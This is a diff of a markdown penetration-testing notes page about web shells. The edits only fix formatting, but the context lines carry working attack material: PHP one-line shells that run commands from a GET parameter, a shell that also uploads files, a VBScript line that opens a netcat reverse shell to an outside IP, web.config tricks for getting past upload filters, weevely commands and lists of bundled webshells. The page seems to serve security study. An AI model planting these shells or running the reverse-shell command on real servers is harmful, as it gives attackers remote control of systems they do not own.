@@ -11,7 +11,7 @@ We can use some built-in functions to execute a shell, however, you may want to 
 Basically:
 
 * You should use the method `$_GET` when someone is requesting data **from** the application.
-* You should use the method `$_POST` when someone is pushing _\(inserting or updating ; or deleting\)_ data **to** the application.
+* You should use the method `$_POST` when someone is pushing _(inserting or updating ; or deleting)_ data **to** the application.
 
 In order for these functions to work, they must be enabled in the `php.ini` configuration file.
 
@@ -23,25 +23,25 @@ The most common of the executions via PHP that we can configure is the following
 ?>
 ```
 
-system\(\):
+system():
 
 ```php
 <?php echo system($_GET['cmd']);?>
 ```
 
-shell\_exec\(\):
+shell\_exec():
 
 ```php
 <?php echo shell_exec($_GET['cmd']);?>
 ```
 
-exec\(\):
+exec():
 
 ```php
 <?php echo exec($_GET['cmd']);?>
 ```
 
-passthru\(\): 
+passthru():&#x20;
 
 ```php
 <?php echo passthru($_GET['cmd']);?>
@@ -67,7 +67,7 @@ Alternatively, we can use different functions like `shell_exec`:
 ?>
 ```
 
-In case we want to make it **multifunctional** , we can manage the variable provided by the user who makes the request, where for the case presented below, in addition to executing commands through the variable `fexec`, we create a new variable `fupload` to transfer files from our local machine to the remote machine in the working directory:
+In case we want to make it **multifunctional **, we can manage the variable provided by the user who makes the request, where for the case presented below, in addition to executing commands through the variable `fexec`, we create a new variable `fupload` to transfer files from our local machine to the remote machine in the working directory:
 
 ```php
 <?php
@@ -85,7 +85,7 @@ In this way, the user who makes the queries could carry out any of the following
 
 * http://10.10.10.10/filename.php?fexec=whoami
 * http://10.10.10.10/filename.php?fupload=filename.php
-* http://10.10.10.10/filename.php?fupload=filename.php&fexec=php+filename.php
+* http://10.10.10.10/filename.php?fupload=filename.php\&fexec=php+filename.php
 
 Alternatively, we can upload and execute the file with:
 
@@ -117,15 +117,15 @@ Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
 
 #### Bypass File Uploads Restrictions
 
-The web.config file plays an important role in storing IIS7 \(and higher\) settings. It is very similar to a .htaccess file in the Apache webserver. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique. Some interesting examples of this technique are accessible via the following GitHub repository: [https://github.com/KCSEC/htshells](https://github.com/KCSEC/htshells)
+The web.config file plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in the Apache webserver. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique. Some interesting examples of this technique are accessible via the following GitHub repository: [https://github.com/KCSEC/htshells](https://github.com/KCSEC/htshells)
 
-In IIS7 \(and higher\), it is possible to do similar tricks by uploading or making a web.config file. A few of these tricks might even be applicable to IIS6 with some minor changes. The techniques below show some different web.config files that can be used to bypass protections around the file uploaders.
+In IIS7 (and higher), it is possible to do similar tricks by uploading or making a web.config file. A few of these tricks might even be applicable to IIS6 with some minor changes. The techniques below show some different web.config files that can be used to bypass protections around the file uploaders.
 
-#### Running web.config as an ASP file <a id="running-webconfig-as-an-asp-file"></a>
+#### Running web.config as an ASP file <a href="running-webconfig-as-an-asp-file" id="running-webconfig-as-an-asp-file"></a>
 
 Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes:
 
-```text
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -162,13 +162,13 @@ This text was extracted from:
 
 Using weevely we can create php webshells easily.
 
-```text
+```
 weevely generate password /root/webshell.php
 ```
 
 Not we execute it and get a shell in return:
 
-```text
+```
 weevely "http://ip/webshell.php" password
 ```
 
@@ -176,7 +176,7 @@ weevely "http://ip/webshell.php" password
 
 [SecLists](https://github.com/danielmiessler/SecLists) is an awesome collection of wordlists, it also includes webshells:
 
-```text
+```
 SecLists/Web-Shells/
 ```
 
@@ -184,7 +184,7 @@ SecLists/Web-Shells/
 
 Kali Linux comes with some webshells in `asp, aspx, cfm, jsp, perl and php`which are under `/usr/share/webshells`:
 
-```text
+```
 /usr/share/webshells/asp:
 cmd-asp-5.1.asp
 cmdasp.asp
@@ -281,8 +281,6 @@ simple-backdoor.php
 findsock.c
 php-findsock-shell.php
 ```
-
-
 
 
 
